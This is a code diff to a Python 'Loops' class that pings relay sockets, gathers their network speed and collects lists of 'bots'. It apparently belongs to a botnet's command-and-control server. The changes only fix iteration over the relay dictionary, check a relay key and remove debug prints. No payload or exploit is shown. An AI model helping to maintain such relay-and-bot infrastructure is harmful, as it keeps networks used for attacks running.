@@ -41,15 +41,17 @@ class Loops():
         socket.send(data.encode())
 
     def _ping(self) -> None:
-        for relay in self.config.relay_list.keys():
+        for relay in self.config.relay_list.copy().keys():
             try:
                 relay.settimeout(3)
                 self.send(relay, 'RPING', False, False)
-                if relay.recv(1024).decode() != f'RPONG[p:{self.config.relay_list}]':
+                data: str = relay.recv(1024).decode()
+
+                if data != f'RPONG[p:{self.config.RELAY_KEY}]':
                     self.config.relay_list.pop(relay)
                     relay.close()
 
-            except Exception: 
+            except Exception:
                 self.config.relay_list.pop(relay)
                 relay.close()
 
@@ -61,24 +63,20 @@ class Loops():
     def _net(self) -> None:
         self.config.speed.clear()
 
-        for relay in self.config.relay_list.keys():
+        for relay in self.config.relay_list.copy().keys():
             print(relay)
             try:
                 relay.settimeout(3)
-
                 self.send(relay, 'RNETSPEED', False, False)
                 data: str = relay.recv(1024).decode()
-                print(data)
 
                 try:
                     if not data:
-                        print('not')
                         self.config.relay_list.pop(relay)
                         relay.close()
                         continue
 
                     self.config.speed.append(int(data))
-                    print('ok')
 
                 except Exception:
                     self.config.relay_list.pop(relay)
@@ -99,7 +97,7 @@ class Loops():
         self.config.bots.clear()
         self.config.temp_relay_bots.clear()
 
-        for relay in self.config.relay_list.keys():
+        for relay in self.config.relay_list.copy().keys():
             try:
                 relay.settimeout(3)
                 self.send(relay, 'RNETBOTS', False, False)
@@ -132,9 +130,9 @@ class Loops():
                 relay.close()
 
         self.config.relay_bots.clear()
-        for i in self.config.temp_relay_bots:
+        for i in self.config.temp_relay_bots.copy():
             self.config.relay_bots.append(i)
-            
+
             # idk what is this for
             if self.relay_api(i, False): print('ok')
             else: print("relay_api error")
